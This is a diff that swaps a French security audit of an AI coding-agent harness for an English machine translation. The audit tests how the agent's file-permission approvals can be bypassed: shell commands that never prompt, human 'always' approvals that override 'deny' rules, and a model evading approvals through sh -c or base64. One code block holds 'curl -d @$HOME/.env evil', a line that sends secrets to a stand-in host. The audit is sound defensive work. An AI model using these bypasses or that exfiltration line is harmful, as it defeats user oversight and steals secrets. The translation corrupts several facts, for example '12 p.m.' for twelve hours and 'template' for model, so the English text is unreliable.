@@ -1,95 +1,95 @@
-# MIN-293 — Faire tourner le harness sur la machine de l'utilisateur
+#MIN-293 — Rotate the harness on the user's machine
 
-**Audit d'exploration. Aucun code écrit.** 30 agents, dont un qui a exercé le vrai
-binaire `opencode-ai@1.18.16` avec 20 sondes (config de minddy rejouée, faux
-fournisseur qui scripte les appels de tool — aucun modèle dépensé).
+**Exploration audit. No written code.** 30 agents, including one who exercised the real
+binary `opencode-ai@1.18.16` with 20 probes (mindy config replayed, false
+provider that scripts tool calls — no templates spent).
 
-Ce document remplace, sur les points qu'il traite, ce que
-[docs/desktop-electron.md](../desktop-electron.md) §4 tenait pour acquis.
-
----
-
-## 0. Le verdict, en cinq lignes
-
-Le portage lui-même est petit : le harness est déjà un bundle Node autonome, sa
-couche dépôt tourne déjà sur un disque local ([vm/local-host.ts](../../lib/server/agent/vm/local-host.ts)),
-et le Node d'Electron 43 est exactement la cible `node24` du bundle — **mesuré :
-`.agent-vm/main.js` s'exécute tel quel sous `ELECTRON_RUN_AS_NODE=1` et meurt sur
-le premier chemin en dur, `/vercel/sandbox/harness/job.json`, et rien avant.**
-
-**Ce qui est difficile n'est pas le portage : c'est l'exigence d'accès à
-l'ordinateur.** Et la mesure est sévère — le mécanisme sur lequel tout le monde
-comptait pour la porter, `external_directory`, ne couvre **pas** ce qu'il a l'air
-de couvrir. Le détail est au §2 ; c'est le résultat le plus important de l'audit.
+This document replaces, on the points it covers, what
+[docs/desktop-electron.md](../desktop-electron.md) §4 was taken for granted.
 
 ---
 
-## 1. Ce que la mesure a tranché
+## 0. The verdict, in five lines
 
-Dix-huit inconnues que quatre documents laissaient ouvertes sont levées. **Presque
-toutes dans le sens défavorable.**
+The port itself is small: the harness is already a standalone Node bundle, its
+repository layer is already running on a local disk ([vm/local-host.ts](../../lib/server/agent/vm/local-host.ts)),
+and Electron Node 43 is exactly the `node24` target of the bundle — **measured:
+`.agent-vm/main.js` runs as is under `ELECTRON_RUN_AS_NODE=1` and dies on
+the first hard path, `/vercel/sandbox/harness/job.json`, and nothing before.**
 
-| # | Mesuré sur `opencode-ai@1.18.16` | Conséquence |
+**What is difficult is not the carrying: it is the requirement of access to
+the computer.** And the measure is severe — the mechanism on which everyone
+counted to wear it, `external_directory`, does **not** cover what it looks like
+to cover. The details are in §2; this is the most important result of the audit.
+
+---
+
+## 1. What the measure decided
+
+Eighteen unknowns that four documents left open are resolved. **Almost
+all in the unfavorable direction.**
+
+| # | Measured on `opencode-ai@1.18.16` | Consequence |
 | --- | --- | --- |
-| 1 | `external_directory: "deny"` **court-circuite avant toute publication** | Le `case "external_directory"` de [opencode-permissions.ts:177-181](../../lib/server/agent/vm/opencode-permissions.ts#L177-L181) **est du code mort**, pas un « second rideau ». Le commentaire qui le décrit ainsi est faux. |
-| 2 | Un `always` humain **écrase un `deny` de config** | Les règles approuvées en session sont concaténées **après** celles de la config, et c'est le **dernier match qui gagne**. Un « oui » sur `~/*` lève un `deny` posé sur `~/.ssh/*`. |
-| 3 | `deny` **n'est pas prioritaire** : l'**ordre de déclaration** décide | Deux configs identiques au seul ordre des clés près donnent DENIED et ALLOWED sur la même lecture. |
-| 4 | **Aucun timeout côté opencode** | Relevé toutes les 12 s pendant **303 s** : demande pendante, tool `running`, session `busy`, sans dénouement. Le seul plafond est le nôtre (12 h). Corollaire : `session.idle` n'arrive jamais, donc tout ce que le superviseur fait au `session.idle` est suspendu aussi. |
-| 5 | Tuer opencode pendant une attente est **irréversible** | Après redémarrage : la session est retrouvée, `GET /permission` rend `[]`, et la part de tool reste figée à `{"status":"running"}` **pour toujours**. Rien ne la ressuscite. |
-| 6 | La **cascade de refus** est réelle | Un round à trois `bash` → **trois demandes pendantes simultanées**. Un `reject` sur la première rejette les deux autres. |
-| 7 | `always` sur `edit` porte le motif **`*`**, pas un chemin | Un seul clic « toujours » rend **toutes** les éditions suivantes muettes. Idem `task` et `webfetch`. `bash`, lui, est par verbe (`echo *`). |
-| 8 | Le `always` est **en mémoire**, fuit entre sessions, meurt au redémarrage | Le harness relançant opencode à chaque tour, **un « toujours » vaut un tour**. Le magasin persistant `/api/permission/saved` existe mais les tools de 1.18.16 n'y écrivent rien. |
-| 9 | `*` **traverse les `/`**, et `~` est expansé | Le grain d'un « oui » est le **sous-arbre**. Un « toujours » sur un fichier à la racine du home donnerait `~/*`. |
-| 10 | `POST /question/:id/reply` **fonctionne, bloque sans timeout, et ne termine pas le tour** | « `ask_user` est terminal » est un **choix de minddy** ([supervisor.ts:1033-1049](../../lib/server/agent/vm/supervisor.ts#L1033-L1049)), motivé par le coût d'une microVM ouverte — motif qui **tombe** sur la machine de l'utilisateur. |
-| 11 | `abort` **ne dénoue pas** les demandes pendantes | Elles fuient et restent répondables après la fin du round. |
-| 12 | Un `deny` nu **retire le tool du catalogue** | `websearch` et `todowrite` ne sont pas « refusés » : ils n'existent pas. Ceci **corrige** la mesure n°4 consignée en tête de [opencode-config.ts:56-60](../../lib/server/agent/vm/opencode-config.ts#L56-L60). |
-| 13 | Un ruleset **par session** en `deny` **ampute le jeu de tools** | Deux propositions comptaient dessus comme d'une ACL propre. Ce n'en est pas une. Le cas `action: "allow"` **reste à mesurer**. |
-| 14 | Le tool `bash` porte un paramètre **`workdir`**, et un `workdir` hors dépôt publie bien `external_directory` avec `metadata.directories` | **Le seul endroit où le shell déclare une intention de chemin de façon fiable.** Cité par aucune proposition. |
-| 15 | `cd` publie `external_directory` et **jamais** `bash` ; `cd .` et `popd` ne publient **rien** | Ces commandes ne passent **jamais** devant `checkCommand`. La mesure n°1 de [opencode-permissions.ts:24-27](../../lib/server/agent/vm/opencode-permissions.ts#L24-L27) (« demande pour TOUTE commande ») est vraie de `echo hi`, fausse de `cd`. |
-| 16 | Une demande venue d'un **sous-agent** porte le sessionID de l'enfant ; la cascade est par session | Aucune proposition ne traite le cas. |
-| 17 | Il n'y a **pas de tool `list`** | `list: "allow"` ([opencode-config.ts:331](../../lib/server/agent/vm/opencode-config.ts#L331)) est un no-op. |
-| 18 | `OPENCODE_SHELL_CWD` **n'existe pas dans le binaire** (0 occurrence) | [opencode-config.ts:645](../../lib/server/agent/vm/opencode-config.ts#L645) est du code mort, et tout raisonnement sur un shell persistant entre rounds est sans fondement. |
+| 1 | `external_directory: "deny"` **bypasses before publishing** | The `case "external_directory"` of [opencode-permissions.ts:177-181](../../lib/server/agent/vm/opencode-permissions.ts#L177-L181) **is dead code**, not a "second curtain". The comment that describes it like this is false. |
+| 2 | A human `always` **overwrites a config `deny`** | The rules approved in session are concatenated **after** those in the config, and it is the **last match that wins**. A “yes” on `~/*` raises a `deny` placed on `~/.ssh/*`. |
+| 3 | `deny` **does not have priority**: the **declaration order** decides | Two identical configs except for the order of the keys give DENIED and ALLOWED on the same reading. |
+| 4 | **No timeout on the opencode side** | Read every 12 s for **303 s**: pending request, tool `running`, session `busy`, without resolution. The only ceiling is ours (12 p.m.). Corollary: `session.idle` never happens, so anything the supervisor does to `session.idle` is suspended too. |
+| 5 | Killing opencode while waiting is **irreversible** | After restart: the session is found, `GET /permission` returns `[]`, and the tool part remains frozen at `{"status":"running"}` **forever**. Nothing brings her back to life. |
+| 6 | The **cascade of refusals** is real | A three-way round `bash` → **three simultaneous pending requests**. A `reject` on the first rejects the other two. |
+| 7 | `always` on `edit` has the pattern **`*`**, not a path | A single click "always" silences **all** subsequent edits. Same as `task` and `webfetch`. `bash` is by verb (`echo *`). |
+| 8 | The `always` is **in memory**, leaks between sessions, dies on reboot | The harness restarts opencode every turn, **one “always” is worth one turn**. The `/api/permission/saved` persistent store exists but the 1.18.16 tools do not write anything to it. |
+| 9 | `*` **crosses `/`**, and `~` is expanded | The grain of a “yes” is the **subtree**. An “always” on a file at the root of home would give `~/*`. |
+| 10 | `POST /question/:id/reply` **works, blocks without timeout, and does not end the round** | "`ask_user` is terminal" is a **mindy choice** ([supervisor.ts:1033-1049](../../lib/server/agent/vm/supervisor.ts#L1033-L1049)), motivated by the cost of an open microVM — motive which **falls** on the user's machine. |
+| 11 | `abort` **does not unwind** pending requests | They flee and remain answerable after the end of the round. |
+| 12 | A bare `deny` **removes the tool from the catalog** | `websearch` and `todowrite` are not “denied”: they do not exist. This **corrects** measure #4 recorded at the top of [opencode-config.ts:56-60](../../lib/server/agent/vm/opencode-config.ts#L56-L60). |
+| 13 | A ruleset **per session** in `deny` **cuts the set of tools** | Two proposals counted on it as a clean ACL. It's not one of them. The `action: "allow"` case **remains to be measured**. |
+| 14 | The `bash` tool carries a parameter **`workdir`**, and a non-repository `workdir` publishes `external_directory` with `metadata.directories` | **The only place where the shell reliably declares a path intent.** Cited by no proposition. |
+| 15 | `cd` publishes `external_directory` and **never** `bash`; `cd .` and `popd` publish **nothing** | These commands **never** pass in front of `checkCommand`. Measure #1 of [opencode-permissions.ts:24-27](../../lib/server/agent/vm/opencode-permissions.ts#L24-L27) (“request for ANY command”) is true of `echo hi`, false of `cd`. |
+| 16 | A request from a **subagent** carries the sessionID of the child; the waterfall is per session | No proposal addresses the case. |
+| 17 | There is **no tool `list`** | `list: "allow"` ([opencode-config.ts:331](../../lib/server/agent/vm/opencode-config.ts#L331)) is a no-op. |
+| 18 | `OPENCODE_SHELL_CWD` **does not exist in binary** (0 occurrences) | [opencode-config.ts:645](../../lib/server/agent/vm/opencode-config.ts#L645) is dead code, and any reasoning about a shell persisting between rounds is baseless. |
 
-> **FAIT (MIN-362, 2026-08-15) : ce tableau n'est plus la source.** Les mesures
-> vivent en sondes pérennes, et c'est là qu'il faut les lire et les relancer —
+> **FACT (MIN-362, 2026-08-15): this table is no longer the source.** The measurements
+> live in perennial probes, and this is where they must be read and relaunched —
 > [opencode-permissions.probe.test.ts](../../lib/server/agent/vm/opencode-permissions.probe.test.ts)
-> (`MDY_OPENCODE_PERMS_PROBE=1`, aucun modèle dépensé),
+> (`MDY_OPENCODE_PERMS_PROBE=1`, no template spent),
 > [opencode-wait.probe.test.ts](../../lib/server/agent/vm/opencode-wait.probe.test.ts)
-> (`MDY_OPENCODE_WAIT_PROBE=1`) et, pour git,
+> (`MDY_OPENCODE_WAIT_PROBE=1`) and, for git,
 > [worktree-hooks.git.test.ts](../../lib/server/agent/worktree-hooks.git.test.ts),
-> qui tourne avec `npm test`. Elles **corrigent** deux lignes de ce tableau, et
-> il faut lire la correction avant de s'appuyer dessus :
+> which runs with `npm test`. They **correct** two lines of this table, and
+> you must read the correction before relying on it:
 >
-> - **ligne 9** — `~` n'est expansé et `*` ne traverse les `/` que sur
->   `external_directory`. Les motifs d'`edit` sont **relatifs au dépôt**, sans
->   `~` : un `edit: {"~/.ssh/*": "deny"}` ne refuse rien et ne demande rien ;
-> - **ligne 12** — le `deny` nu retire le tool de ce qui est **offert au
->   modèle**, mais `/experimental/tool` continue de le lister.
+> - **line 9** — `~` is only expanded and `*` only crosses `/` on
+> `external_directory`. The reasons for `edit` are **relative to the deposit**, without
+> `~`: a `edit: {"~/.ssh/*": "deny"}` refuses nothing and asks for nothing;
+> - **line 12** — the bare `deny` removes the tool from what is **offered to
+> model**, but `/experimental/tool` continues to list it.
 >
-> Le détail, avec ce qu'elles ont ajouté au §9, est au
-> [§2.32 du dossier opencode](../harness-opencode.md).
+> The detail, with what they added in §9, is in
+> [§2.32 from opencode folder](../harness-opencode.md).
 
 ---
 
-## 2. Le mur de papier
+## 2. The paper wall
 
-**C'est le résultat central de l'audit.** L'exigence « l'agent doit atteindre des
-fichiers hors de son dossier, avec des demandes d'approbation » se traduisait
-naturellement par : ouvrir `external_directory`, escalader à l'humain. Mesuré
-commande par commande, **ce mécanisme ne couvre presque rien.**
+**This is the central result of the audit.** The requirement “the agent must achieve
+files out of its folder, with requests for approval" translated
+naturally by: open `external_directory`, escalate to human. Measured
+order by order, **this mechanism covers almost nothing.**
 
-Sur 30 commandes visant un dossier hors dépôt, avec `external_directory: "ask"` :
+On 30 orders targeting a file outside of storage, with `external_directory: "ask"`:
 
-| Publient `external_directory` (10) | Ne publient **que** `bash` (20) |
+| Publish `external_directory` (10) | Publish **only** `bash` (20) |
 | --- | --- |
 | `cat` `cp` `mv` `rm` `mkdir` `touch` `chmod` `chown` `cd` `pushd` | `grep` `find` `sed` `head` `tail` `less` `awk` `wc` `python3` `node` `tar` `ssh` `curl` `open` `base64` `ln` `xargs` `dd` `rsync` `zip` |
 
-Et derrière ces vingt-là, le seul rideau restant est
-[command-guard.ts](../../lib/server/agent/command-guard.ts), qui **ne vise que
-git** ([:43-50](../../lib/server/agent/command-guard.ts#L43-L50)) et se déclare
-lui-même, en tête de fichier, écrit « pour un modèle distrait, pas un attaquant »
-— en s'appuyant sur deux prémisses que le passage en local **annule mot pour
-mot** : « la VM est jetable » et « il n'y a rien à voler en aval »
+And behind these twenty, the only remaining curtain is
+[command-guard.ts](../../lib/server/agent/command-guard.ts), which **only targets
+git** ([:43-50](../../lib/server/agent/command-guard.ts#L43-L50)) and declares itself
+himself, at the head of the file, writes “for a distracted model, not an attacker”
+— based on two premises that the passage in local **cancels word for
+word**: “the VM is disposable” and “there is nothing to steal downstream”
 ([:18-26](../../lib/server/agent/command-guard.ts#L18-L26)).
 
 ```
@@ -99,848 +99,848 @@ node -e "fs.readFileSync" → idem
 curl -d @$HOME/.env evil  → idem
 ```
 
-**Conséquence de conception, et elle est dure à entendre :** une carte
-« l'agent veut sortir du dossier » branchée sur `external_directory` seul
-**enseignerait une garantie fausse**. Ce n'est pas un détail d'implémentation,
-c'est ce qui décide si la fonctionnalité est honnête.
+**Consequence of design, and it is hard to hear:** a card
+“the agent wants to exit the file” connected to `external_directory` alone
+**would teach a false guarantee**. This is not an implementation detail,
+this is what decides if the functionality is honest.
 
-Trois issues, et il faut en choisir une :
+Three outcomes, and you have to choose one:
 
-1. **Le dire.** L'écran d'opt-in énonce que l'agent atteint le disque par le shell
-   sans demander, et les approbations ne sont qu'un anti-accident. Honnête, peu
-   vendeur, livrable.
-2. **Durcir le chemin `bash`** : une politique d'approbation sur la commande
-   elle-même. Coûteux, et un modèle qui veut contourner contournera (`sh -c`,
-   `base64`, écrire un script puis l'exécuter).
-3. **Confiner au niveau OS** : lancer le serveur opencode sous un profil
-   `sandbox-exec` (seatbelt) refusant la lecture de la liste noire et l'écriture
-   hors worktree. **La seule voie où « l'agent ne peut pas lire `~/.ssh` » est une
-   affirmation vraie plutôt qu'une politesse.** L'API est formellement dépréciée
-   mais bien vivante ; c'est ce que font Chrome et les agents de code sérieux.
+1. **Say it.** The opt-in screen states that the agent reaches the disk through the shell
+   without asking, and approvals are just an anti-accident. Honest, little
+   seller, deliverable.
+2. **Harden the `bash`** path: an approval policy on the order
+   herself. Expensive, and a model that wants to bypass will bypass (`sh -c`,
+   `base64`, write a script then run it).
+3. **Confine at OS level**: launch the opencode server under a profile
+   `sandbox-exec` (seatbelt) refusing blacklist reading and writing
+   outside worktree. **The only way where "agent cannot read `~/.ssh`" is a
+   true statement rather than a polite one.** The API is formally deprecated
+   but very much alive; This is what Chrome and Serious Code Agents do.
 
-**Recommandation : prototyper (3) dans ce chantier, même sans le livrer.** Savoir
-si le seatbelt tient sous `utilityProcess.fork` change la valeur de tout le reste
-— si oui, les permissions d'opencode redeviennent du confort par-dessus une vraie
-frontière ; si non, on livre (1) et on l'assume par écrit.
+**Recommendation: prototype (3) in this site, even without delivering it.** Know
+if the seatbelt fits under `utilityProcess.fork` changes the value of everything else
+— if yes, opencode permissions become comfort again over a real one
+border; if not, we deliver (1) and assume it in writing.
 
 ---
 
-## 3. Les approbations humaines
+## 3. Human approvals
 
-### 3.1 Le point de branchement
+### 3.1 The connection point
 
-`decidePermission` est un module **pur et synchrone**, verdict binaire
-(`once` | `reject`), et toute sa doctrine revendique cette pureté
+`decidePermission` is a **pure and synchronous** module, binary verdict
+(`once` | `reject`), and all its doctrine claims this purity
 ([opencode-permissions.ts:7-19](../../lib/server/agent/vm/opencode-permissions.ts#L7-L19)).
-**Il faut la garder.** Le module gagne un troisième verdict — `ask` — qu'il
-**rend** ; c'est le superviseur qui décide quoi en faire. « Ce oui couvre-t-il
-cette demande ? » est la question la plus facile à rater et la plus facile à
-tester sans serveur.
+**You have to keep it.** The module gains a third verdict — `ask` — that it
+**render**; it is the supervisor who decides what to do with it. “Does this yes cover
+this request? » is the easiest question to miss and the easiest to
+test without a server.
 
-### 3.2 L'attente ne doit pas vivre dans la boucle d'events
+### 3.2 Waiting should not live in the event loop
 
-Le superviseur lit le flux à la main **précisément** pour que rien ne le gèle
+The supervisor reads the stream by hand **precisely** so that nothing freezes it
 ([supervisor.ts:849-862](../../lib/server/agent/vm/supervisor.ts#L849-L862)).
-Un `await` de deux minutes posé dans la branche `if (out.permission)` arrête la
-consommation du flux et emporte avec lui le direct, le checkpoint (donc
-`last_activity_at`, donc le chien de garde), le Stop et la deadline.
+A two-minute `await` placed in the `if (out.permission)` branch stops the
+consumption of the flow and takes with it the live, the checkpoint (therefore
+`last_activity_at`, therefore the watchdog), the Stop and the deadline.
 
-**La forme qui tient :** le superviseur *enregistre* la demande, la poste, et
-**repart lire le flux**. Le tool est suspendu par opencode ; notre boucle ne l'est
-jamais. La réponse redescend par une surface du plan de contrôle drainée au
-battement — accéléré à 1 s tant qu'une demande pend, sans quoi chaque clic coûte
-jusqu'à cinq secondes de silence et l'utilisateur cliquera deux fois.
+**The form that holds:** the supervisor *records* the request, mails it, and
+**goes back to reading the feed**. The tool is suspended by opencode; our loop is not
+never. The response goes back down through a surface of the control plane drained at the
+beat — accelerated to 1 s while a request is pending, otherwise each click costs
+up to five seconds of silence and the user will click twice.
 
-### 3.3 Le « defer » n'est pas réalisable
+### 3.3 The “defer” is not feasible
 
-L'option séduisante — couper le tour, répondre au tour suivant, comme `ask_user`
-le fait déjà — **est morte à la mesure n°5** : le `callId` ne survit pas à la mort
-du process, et rien ne le ressuscite. On ne peut pas rejouer le même appel ; il
-faudrait convertir l'approbation en règle et *espérer* que le modèle refasse le
-même geste.
+The attractive option — cut turn, respond next turn, like `ask_user`
+already does it — **died at measure n°5**: the `callId` does not survive death
+of the process, and nothing revives it. We cannot replay the same call; he
+would have to convert the approval into a rule and *hope* that the model redoes it
+same gesture.
 
-**En revanche, la mesure n°10 ouvre une porte que personne n'avait vue :**
-`POST /question/:id/reply` bloque sans timeout et **rend la main au modèle sans
-terminer le tour**. Le canal « l'humain répond dans le tour » existe **déjà** côté
-binaire, pour les questions. C'est probablement le meilleur véhicule pour une
-approbation **rare et lisible** (« l'agent veut lire `~/Documents` ») — bien plus
-que d'inventer un troisième verdict pour un `external_directory` dont on vient de
-mesurer qu'il ne couvre que dix commandes.
+**On the other hand, measure no. 10 opens a door that no one had seen:**
+`POST /question/:id/reply` blocks without timeout and **returns control to the model without
+complete the round**. The “human responds in turn” channel **already** exists
+binary, for questions. It is probably the best vehicle for a
+**rare and readable** approval (“agent wants to read `~/Documents`”) — much more
+than inventing a third verdict for a `external_directory` which we have just
+measure that it only covers ten commands.
 
-### 3.4 Ce qu'il faut décider, et que rien ne tranche pour nous
+### 3.4 What must be decided, and that nothing decides for us
 
-- **La fatigue.** `bash: "ask"` demande pour *toute* commande. Sans politique de
-  tri, un tour ordinaire produit des dizaines à des centaines de demandes — c'est
-  l'inverse du produit. Au troisième run, il cliquera sans lire.
-- **La durée d'un « oui ».** Mesure n°8 : le protocole ne persiste rien. Si on
-  veut qu'un oui dépasse le tour, **c'est à nous de le stocker** et de le rejouer
-  en règles au tour suivant. Et mesure n°7 : ne **pas** offrir « toujours » sur
-  `edit` — le motif est `*`, et la permission `edit` est la seule source de
-  « fichiers changés » du direct ([supervisor.ts:1004](../../lib/server/agent/vm/supervisor.ts#L1004)).
-- **Le lot.** Mesure n°6 : plusieurs demandes pendantes est le cas ordinaire, et
-  un refus les refuse toutes. La carte doit dire « l'agent demande N choses »,
-  pas offrir un tri. Et il faut traduire `permission.replied` (aujourd'hui ignoré)
-  pour rendre inertes les cartes annulées par cascade, sinon l'UI affiche des
-  boutons qui répondront **404**.
-- **Le cas fondamental de minddy.** Un run part d'un ticket, souvent quand
-  personne ne regarde. Un TTL de 10 min avec un utilisateur absent produit un
-  refus par défaut — que le modèle contournera par le shell (§2). Claude Code a
-  un nom pour ce mode : `dontAsk`, « the session never waits for input ». C'est
-  probablement le bon défaut pour un run non-interactif.
-- **Les sous-agents** (mesure n°16) : de qui vient la carte, dans quelle bande du
-  fil, et le crédit `running + pending` du plafond est calculé **à l'instant du
-  verdict** — le décaler de plusieurs minutes change ce que le plafond mesure.
+- **Fatigue.** `bash: "ask"` request for *any* order. Without policy of
+  sorting, an ordinary round produces tens to hundreds of requests — this is
+  the opposite of the product. On the third run it will click without reading.
+- **The duration of a “yes”.** Measure n°8: the protocol does not persist anything. If we
+  wants a yes to go beyond the turn, **it's up to us to store it** and replay it
+  in order in the next round. And measure n°7: do **not** offer “always” on
+  `edit` — the pattern is `*`, and the `edit` permission is the only source of
+  “files changed” from direct ([supervisor.ts:1004](../../lib/server/agent/vm/supervisor.ts#L1004)).
+- **The batch.** Measure n°6: several pending requests is the ordinary case, and
+  a refusal refuses them all. The card should say “agent requests N things”,
+  not offer sorting. And you have to translate `permission.replied` (now ignored)
+  to make cards canceled by cascade inert, otherwise the UI displays
+  buttons that will respond **404**.
+- **The fundamental case of minddy.** A run starts from a ticket, often when
+  no one looks. A 10 min TTL with an absent user produces a
+  refusal by default — which the model will bypass by the shell (§2). Claude Code has
+  a name for this mode: `dontAsk`, “the session never waits for input”. It's
+  probably the right default for a non-interactive run.
+- **Sub-agents** (measure no. 16): who does the card come from, in which band of the
+  wire, and the `running + pending` ceiling credit is calculated **at the time of
+  verdict** — shifting it by several minutes changes what the cap measures.
 
-### 3.5 Le transport n'existe pas
+### 3.5 Transportation does not exist
 
-Il n'y a **aucun canal descendant adressé** aujourd'hui. Le seul qui existe — le
-steering — est un sondage à 5 s dont la sémantique est « coupe le round et
-repose », sans corrélation (ni type, ni destinataire, ni id de demande). Le
-réutiliser **détruirait le round où le tool est suspendu**, coûterait un contrôle
-de quota par « oui », et — pire — re-queue le run + kick le drain, c'est-à-dire
-**relancerait un tour dans le cloud** alors que le tour attend sur le Mac.
+There are **no downlink channels addressed** today. The only one that exists — the
+steering — is a 5 s poll whose semantics are “cut the round and
+rests”, without correlation (neither type, nor recipient, nor request id). The
+reuse **would destroy the round where the tool is suspended**, would cost a check
+of quota by “yes”, and — worse — re-queue the run + kick the drain, that is to say
+**would restart a tour in the cloud** while the tour waits on the Mac.
 
-Deux pièges du dépôt, déjà payés ailleurs :
+Two pitfalls of the deposit, already paid for elsewhere:
 
-- La diffusion d'un event depuis le plan de contrôle est une promesse **détachée**
+- Broadcasting an event from the control plane is a **detached** promise
   (`void broadcast(…)`, [live.ts:105-110](../../lib/server/agent/live.ts#L105-L110)),
-  là où le voisin `/stream` utilise `afterOrNow` pour exactement cette raison. La
-  montée « instantanée » d'une demande n'est pas garantie.
-- Sans migration du CHECK de `agent_run_events.type`, la demande disparaît **en
-  silence** (`appendEvent` avale l'échec, [runs.ts:1358-1378](../../lib/server/agent/runs.ts#L1358-L1378)).
-  Le piège a déjà été payé deux fois — MIN-86, `quota_exhausted`.
+  where neighbor `/stream` uses `afterOrNow` for exactly this reason. The
+  “Instantaneous” rise in demand is not guaranteed.
+- Without migration of the CHECK of `agent_run_events.type`, the request disappears **in
+  silence** (`appendEvent` swallow failure, [runs.ts:1358-1378](../../lib/server/agent/runs.ts#L1358-L1378)).
+  The trap has already been paid twice — MIN-86, `quota_exhausted`.
 
-Et personne n'écoute au repos : `useAgentRunLive` ne s'abonne que si le run
-travaille **et** que la conversation est montée. **La notification est le seul
-chemin qui rejoint un humain absent** — or l'app de bureau émet ses bannières
-depuis le *renderer* en API web, qui n'a **ni boutons ni champ de réponse**.
-`electron.Notification` (qui, lui, a `actions` et `hasReply`) n'est instancié nulle
-part.
+And no one listens when idle: `useAgentRunLive` only subscribes if the run
+works **and** the conversation has started. **Notification is the only
+path that joins an absent human** — but the desktop app emits its banners
+from the *renderer* in web API, which has **neither buttons nor response field**.
+`electron.Notification` (which has `actions` and `hasReply`) is not instantiated null
+leaves.
 
 ---
 
-## 4. Les trois verrous
+## 4. The three locks
 
-### Verrou 1 — prouver quel run on est
+### Lock 1 — prove which run you are on
 
-**Retenu : un jeton HS256 auto-porteur `{rid, gen, exp}`**, 15 min glissantes,
-patron exact de [sso-jwt.ts](../../lib/feedback/sso-jwt.ts) (HS256 seul,
-`timingSafeEqual`, plafond de TTL imposé à la vérification).
+**Retained: a self-bearing HS256 token `{rid, gen, exp}`**, 15 min sliding,
+exact pattern of [sso-jwt.ts](../../lib/feedback/sso-jwt.ts) (HS256 alone,
+`timingSafeEqual`, TTL ceiling imposed on verification).
 
-**Vérifié, et ça tranche l'inconnue du cadrage :** `defineSandboxProxy(handler,
-invalidRequestHandler?)` accepte un **second argument**, appelé avec la requête
-**originale, corps non consommé**, quand les en-têtes `vercel-forwarded-*`
-manquent. La voie locale n'est donc **ni une route jumelle ni un fork** : c'est un
-`catch` sur la porte existante. Le 413, le parsing, la dérivation de `surface` et
-l'appel à `handleControlPlaneRequest` restent écrits **une seule fois**.
+**Checked, and that resolves the unknown of the framing:** `defineSandboxProxy(handler,
+invalidRequestHandler?)` accepts a **second argument**, called with the request
+**original, unconsumed body**, when headers `vercel-forwarded-*`
+are missing. The local route is therefore **neither a twin route nor a fork**: it is a
+`catch` on the existing door. The 413, parsing, derivation of `surface` and
+the call to `handleControlPlaneRequest` remains written **only once**.
 
-Pourquoi pas le jeton opaque haché : `POST /stream` est servi **sans lire la ligne
-du run**, délibérément (~4 appels/s, ~29 000 par tour de deux heures — le
-raisonnement est écrit en clair, [control-plane.ts:291-313](../../lib/server/agent/control-plane.ts#L291-L313)).
-Un hash impose un lookup par requête, c'est-à-dire exactement la charge que ce
-court-circuit existe pour supprimer. La **révocation** se paie là où la ligne est
-déjà lue : un entier `agent_runs.local_exec_gen` comparé au claim `gen`.
+Why not the hashed opaque token: `POST /stream` is served **without reading the line
+of the run**, deliberately (~4 calls/s, ~29,000 per two-hour lap — the
+reasoning is written in plain text, [control-plane.ts:291-313](../../lib/server/agent/control-plane.ts#L291-L313)).
+A hash imposes a lookup per request, that is to say exactly the load that this
+short circuit exists to remove. **Revocation** is paid where the line is
+already read: an integer `agent_runs.local_exec_gen` compared to the claim `gen`.
 
-> **Correction au cadrage, et elle est tranchante.** Un run local n'a pas de
-> `loop_command_id`, donc `reapDeadVmRuns` ne prend pas la borne de 2 h mais la
-> branche « jamais lancé » de **15 minutes** ([drain.ts:255-262](../../lib/server/agent/drain.ts#L255-L262)).
-> **Le chien de garde tue tout run local de plus d'un quart d'heure**, stampe
-> `completed`, publie « l'agent s'est arrêté » et facture du compute.
+> **Correction to the framing, and it is sharp.** A local run has no
+> `loop_command_id`, therefore `reapDeadVmRuns` does not take the 2 h limit but the
+> branch "never launched" of **15 minutes** ([drain.ts:255-262](../../lib/server/agent/drain.ts#L255-L262)).
+> **The watchdog kills any local run lasting more than a quarter of an hour**, stampe
+> `completed`, publishes “the agent has stopped” and charges compute.
 
-**Le dégât d'un jeton volé, énuméré et non minimisé :** `/repo-auth` rend un token
-d'installation `repo-write` **à la demande, renouvelable indéfiniment**
-([control-plane.ts:540-573](../../lib/server/agent/control-plane.ts#L540-L573)) ;
-`/tool/*` sert `create_issue`, `set_scratchpad` (réécriture intégrale du carnet
-privé) et `web_search`, **au nom de `run.created_by`** ; `GET /messages`
-**consomme** la file de steering. Seule `/rest` exige que le run soit actif.
+**The damage of a stolen token, enumerated and not minimized:** `/repo-auth` returns a token
+installation code `repo-write` **on request, renewable indefinitely**
+([control-plane.ts:540-573](../../lib/server/agent/control-plane.ts#L540-L573));
+`/tool/*` serves `create_issue`, `set_scratchpad` (complete rewriting of the notebook
+private) and `web_search`, **on behalf of `run.created_by`**; `GET /messages`
+**consumes** the steering queue. Only `/rest` requires the run to be active.
 
-→ Réduire le **pouvoir** du jeton plutôt que prétendre le protéger : ne pas servir
-`/repo-auth` sur le chemin local (le renouvellement passe par l'app, qui a la
-session utilisateur), exiger `status = 'running'` sur **toutes** les surfaces
-locales, retirer `set_scratchpad` du chemin local.
+→ Reduce the **power** of the token rather than claiming to protect it: do not serve
+`/repo-auth` on the local path (renewal goes through the app, which has the
+user session), require `status = 'running'` on **all** surfaces
+local, remove `set_scratchpad` from the local path.
 
-### Verrou 2 — la clé du modèle
+### Lock 2 — the pattern key
 
-**Retenu : la clé descend d'un cran seulement** — jusqu'au proxy LLM du harness,
-gardée en mémoire, **jamais** dans `job.json` ni dans `OPENCODE_CONFIG_CONTENT`
-(qui entre dans l'environnement du serveur opencode, donc lisible par `env`).
-**Pas de mint = pas de run local**, au lieu de la dégradation silencieuse
-d'aujourd'hui vers `OPENROUTER_API_KEY`, la clé plateforme **sans plafond**,
-partagée avec Numo, la transcription et les embeddings.
+**Retained: the key goes down one notch only** — to the LLM proxy of the harness,
+kept in memory, **never** in `job.json` nor in `OPENCODE_CONFIG_CONTENT`
+(which enters the opencode server environment, therefore readable by `env`).
+**No mint = no local run**, instead of silent degradation
+from today to `OPENROUTER_API_KEY`, the platform key **without cap**,
+shared with Numo, transcription and embeddings.
 
-Le relais serveur est le **repli**, pas la v1 : il ne réduit pas le dégât réel (ce
-qu'un modèle hostile peut faire avec la clé, il peut le faire à travers le relais)
-et fait passer 100 % des tokens d'un tour de 12 h par une fonction plafonnée à
-300 s.
+The server relay is the **fallback**, not v1: it does not reduce the real damage (this
+what a hostile model can do with the key, it can do it through the relay)
+and passes 100% of the tokens of a 12-hour round through a function capped at
+300 sec.
 
-> **Faille dans la garde proposée, mesurée.**
